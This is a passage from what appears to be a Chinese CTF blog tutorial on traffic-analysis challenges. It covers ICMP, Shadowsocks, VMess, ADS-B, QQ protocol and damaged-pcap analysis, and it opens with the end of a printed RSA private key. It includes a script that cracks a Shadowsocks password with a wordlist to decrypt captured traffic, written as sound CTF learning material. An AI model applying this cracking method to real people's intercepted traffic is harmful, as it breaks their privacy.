</span></span><span class=line><span class=cl>kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN
</span></span><span class=line><span class=cl>+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
</span></span><span class=line><span class=cl>AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH
</span></span><span class=line><span class=cl>/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
</span></span><span class=line><span class=cl>2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----</span></span></code></pre></td></tr></table></div></div><p>例题2-2024铁三初赛 流量分析</p><h2 class=heading-element id=icmp流量分析><span>ICMP流量分析</span>
<a href=#icmp%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>flag 可能藏在每一帧的长度中</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 1.pcapng -Y <span class=s2>&#34;icmp&#34;</span> -T fields -e frame.len <span class=p>|</span> uniq &gt; data.txt</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>item</span><span class=p>)</span><span class=o>-</span><span class=mi>42</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>例题1-第三届“百越杯”福建省高校网络空间安全大赛-要想会，先学会</p><h2 class=heading-element id=vpn流量分析><span>VPN流量分析</span>
<a href=#vpn%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=shadowsocks流量分析><span>Shadowsocks流量分析</span>
<a href=#shadowsocks%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>例题-2023强网杯-谍影重重3.0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#请求解密脚本</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>EVP_BytesToKey</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>key_len</span><span class=p>,</span> <span class=n>iv_len</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>m</span><span class=p>))</span> <span class=o>&lt;</span> <span class=p>(</span><span class=n>key_len</span> <span class=o>+</span> <span class=n>iv_len</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>md5</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>m</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>        <span class=n>md5</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>md5</span><span class=o>.</span><span class=n>digest</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>ms</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>ms</span><span class=p>[:</span><span class=n>key_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>ms</span><span class=p>[</span><span class=n>key_len</span><span class=p>:</span><span class=n>key_len</span> <span class=o>+</span> <span class=n>iv_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>key</span><span class=p>,</span> <span class=n>iv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key_len</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=mi>256</span><span class=o>/</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iv_len</span> <span class=o>=</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>    <span class=n>mode</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CFB</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>EVP_BytesToKey</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>key_len</span><span class=p>,</span> <span class=n>iv_len</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[:</span><span class=n>iv_len</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>real_cipher</span> <span class=o>=</span> <span class=n>cipher</span><span class=p>[</span><span class=n>iv_len</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>obj</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>mode</span><span class=p>,</span> <span class=n>iv</span><span class=p>,</span> <span class=n>segment_size</span><span class=o>=</span><span class=mi>128</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=n>obj</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>real_cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>plain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl><span class=n>cipher</span> <span class=o>=</span> <span class=s1>&#39;e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 因为password未知，所以我们这里尝试用字典进行爆破</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;rockyou.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>password</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>plain</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>password</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;HTTP&#39;</span> <span class=ow>in</span> <span class=n>plain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>password</span><span class=o>.</span><span class=n>decode</span><span class=p>(),</span> <span class=n>plain</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=vmessv2ray流量分析><span>VMess(V2ray)流量分析</span>
<a href=#vmessv2ray%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h4 class=heading-element id=vmessmd5><span>VMessMD5</span>
<a href=#vmessmd5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>【例题：2022强网杯-谍影重重】</p><h4 class=heading-element id=vmessaead><span>VMessAEAD</span>
<a href=#vmessaead class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>【例题：2024 DubheCTF-authenticated mess & unauthenticated less】</p><h2 class=heading-element id=ads-b流量分析><span>ADS-B流量分析</span>
<a href=#ads-b%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>飞机/航空器流量，找到流量数据，用pyModeS模块分析即可</p><p>例题</p><p><strong>[2023 强网杯] 谍影重重2.0</strong></p><p>下载附件得到一个只有TCP流量的流量包
题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE
问了GPT得知飞机常见的协议中有ADS-B，然后在网上找到pyModeS这个模块
在参考链接：https://gitee.com/wangmin-gf/ads-b 看到了与tcp.payload中相似的数据
使用tshark提取出流量包中的数据，然后使用这个脚本批量解密找speed最快的即可</p><p>tshark -r attach.pcapng -T fields -e &ldquo;tcp.payload&rdquo; | sed &lsquo;/^\s*$/d&rsquo; > tshark.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pyModeS</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;tshark.txt&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(item.strip())</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>item</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span> <span class=o>!=</span> <span class=mi>46</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>pyModeS</span><span class=o>.</span><span class=n>tell</span><span class=p>(</span><span class=n>item</span><span class=o>.</span><span class=n>strip</span><span class=p>()[</span><span class=mi>18</span><span class=p>:</span><span class=mi>46</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;===========================================================================&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>===========================================================================</span>
</span></span><span class=line><span class=cl>                     Message: 8d79a05e990ccda6f80886dd9544
</span></span><span class=line><span class=cl>                ICAO address: 79a05e
</span></span><span class=line><span class=cl>             Downlink Format: <span class=m>17</span>
</span></span><span class=line><span class=cl>                    Protocol: Mode-S Extended Squitter <span class=o>(</span>ADS-B<span class=o>)</span>
</span></span><span class=line><span class=cl>                        Type: Airborne velocity
</span></span><span class=line><span class=cl>                       Speed: <span class=m>371</span> knots
</span></span><span class=line><span class=cl>                       Track: 213.3474959459136 degrees
</span></span><span class=line><span class=cl>               Vertical rate: -64 feet/minute
</span></span><span class=line><span class=cl>                        Type: Ground <span class=nv>speed</span>
</span></span><span class=line><span class=cl><span class=o>===========================================================================</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=oicq协议qq协议><span>OICQ协议(QQ协议)</span>
<a href=#oicq%e5%8d%8f%e8%ae%aeqq%e5%8d%8f%e8%ae%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p><img loading=lazy src=/posts/5422d65/imgs/image-20250302192720139.png alt=/posts/5422d65/imgs/image-20250302192720139.png height=1528 width=2560></p><p>可以分析得到QQ号</p><h2 class=heading-element id=损坏的流量包分析><span>损坏的流量包分析</span>
<a href=#%e6%8d%9f%e5%9d%8f%e7%9a%84%e6%b5%81%e9%87%8f%e5%8c%85%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>例题-第一届“百度杯”信息安全攻防总决赛 find the flag（flag藏在 frame29-41 的 ip.id 字段中）</p><p>打开流量包后发现有如下的报错</p><p><img loading=lazy src=/posts/5422d65/imgs/N10.png alt=/posts/5422d65/imgs/N10.png height=1600 width=2557></p><p>可以直接使用 <a href=https://f00l.de/hacking/pcapfix.php target=_blank rel="external nofollow noopener noreferrer">在线网站</a> 修复</p><p>修复完成以后就是正常的流量分析了</p><h2 class=heading-element id=从流量包中找异常流量><span>从流量包中找异常流量</span>
<a href=#%e4%bb%8e%e6%b5%81%e9%87%8f%e5%8c%85%e4%b8%ad%e6%89%be%e5%bc%82%e5%b8%b8%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数，
然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2025-05-15 10:15:27">更新于 2025-05-15&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md><span><a href=/posts/5422d65/index.md title=阅读原始文档 class=link-to-markdown>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 X" data-sharer=twitter data-url=https://goodlunatic.github.io/posts/5422d65/ data-title=Misc-流量分析 data-hashtags=CTF,Misc><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://goodlunatic.github.io/posts/5422d65/ data-hashtag=CTF><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://goodlunatic.github.io/posts/5422d65/ data-title=Misc-流量分析><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ctf/ class=post-tag title="标签 - CTF">CTF</a><a href=/tags/misc/ class=post-tag title="标签 - Misc">Misc</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/32c3b27/ class=post-nav-item rel=prev title="DASCTF 2024最后一战 Misc Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>DASCTF 2024最后一战 Misc Writeup</a><a href=/posts/ca974cb/ class=post-nav-item rel=next title="Frida Learning Record">Frida Learning Record<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment><script src=https://giscus.app/client.js data-repo=goodlunatic/goodlunatic.github.io data-repo-id=R_kgDOQHqgBw data-category=Announcements data-category-id=DIC_kwDOQHqgB84Cw_4D data-mapping=pathname data-strict=0 data-theme=preferred_color_scheme data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-loading=lazy crossorigin=anonymous async defer></script></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/ rel="external nofollow noopener noreferrer">giscus</a>.</noscript></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered order-1">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd">FixIt</a></div><div class="footer-line copyright order-2" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2025</span><span class=author itemprop=copyrightHolder>
